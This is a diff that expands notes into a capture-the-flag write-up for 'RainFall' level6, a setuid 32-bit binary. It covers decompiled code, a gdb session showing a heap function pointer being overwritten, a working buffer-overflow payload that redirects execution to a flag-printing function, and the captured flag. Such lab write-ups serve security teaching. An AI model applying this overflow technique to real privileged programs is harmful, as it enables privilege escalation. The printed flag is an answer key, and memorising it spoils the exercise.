@@ -1,13 +1,129 @@
+# Level 6
 
-Vulnerability with srctpy in size fixed buffer (0x40)
+## General Informations 
 
-=> 2 buffers adjacent in the heap 
-=> We can overwrite the address of m() in the heap to the address of n()
-=> The offset is 72 bytes + adrress
-=> We can read the flag 
+**Path** : `/home/user/level6/level6` </br>
+**File** : 
+```
+level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6`
 
--> 72 bytes + 4 bytes for addrress of m()
+## Static Analysis
 
-address of n(): 0x08048454 
+After decompiling the binary with ghidra we get the pseudo code below: 
 
-./level6 `python -c 'print "A"*72 + "\x54\x84\x04\x08"'`
+```
+void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
+{
+  puts("Nope");
+  return;
+}
+
+void n(void)
+{
+  system("/bin/cat /home/user/level7/.pass");
+  return;
+}
+
+void main(undefined4 param_1,int param_2)
+{
+  char *__dest;
+  undefined4 *puVar1;
+  
+  __dest = (char *)malloc(0x40);
+  puVar1 = (undefined4 *)malloc(4);
+  *puVar1 = m;
+  strcpy(__dest,*(char **)(param_2 + 4));
+  (*(code *)*puVar1)();
+  return;
+}
+```
+
+- `main`
+  - Allocates a first buffer of 64 bytes and a second one of 4 bytes.
+  - Stores the address of the function `m` in the second buffer (`puVar1`).
+  - Copies user input into the first buffer (`_dest`).
+  - Finally, dereferences the second buffer (`puVar1`) and calls the function at that address.
+- `n`: calls `cat` to print the flag.
+- `m`: prints "Nope" to the terminal.
+
+
+## Vulnerability found 
+
+The `strcpy` function does not verify the size of the user input, even if this size is greater than the destination buffer size. This allows us to overflow the buffer and overwrite data that follows in memory.
+
+
+## Dynamic Analysis
+
+To observe how the heap behaves, we place a breakpoint just after the `strcpy` call:
+```
+(gdb) disas main 
+...
+   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+   0x080484ca <+78>:	mov    0x18(%esp),%eax
+...
+(gdb) b *0x080484ca
+Breakpoint 1 at 0x80484ca
+```
+
+Then we run the program with the fullfilled buffer:
+```
+(gdb) r $(python -c 'print "A" * 64')
+(gdb) i r
+eax            0x804a008	134520840
+...
+(gdb) x/24x 0x804a008
+0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
+0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
+```
+
+The `eax` register holds the address of the buffer in the heap (`0x804a008`). </br>
+When we examine memory starting from that address, we see the value `0x08048468`, which is the address of the function `m`. 
+This makes sense, as the second buffer (`puVar1`) was allocated right after the first one and holds the pointer to `m`. </br>
+What happens if we try to overwrite that address?
+```
+(gdb) r $(python -c 'print "A" * 76')
+
+Breakpoint 1, 0x080484ca in main ()
+(gdb) x/24x 0x804a008
+0x804a008:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a018:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a028:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a038:	0x41414141	0x41414141	0x41414141	0x41414141
+0x804a048:	0x41414141	0x41414141	0x41414141	0x00000000
+0x804a058:	0x00000000	0x00020fa9	0x00000000	0x00000000
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+```
+
+The program crashes with a segmentation fault!  
+This means we can replace the address of `m` with the address of `n` (`0x08048454`).
+
+
+## Payload construction 
+
+We simply write enough bytes to reach the location of the second buffer, then overwrite the address of `m` with the address of `n`:
+```
+python -c 'print "A"*72 + "\x54\x84\x04\x08"'
+```
+
+## Demonstration 
+
+```
+level6@RainFall:~$ ./level6 $(python -c 'print "A"*72 + "\x54\x84\x04\x08"')
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
+
+## Flag 
+
+```
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
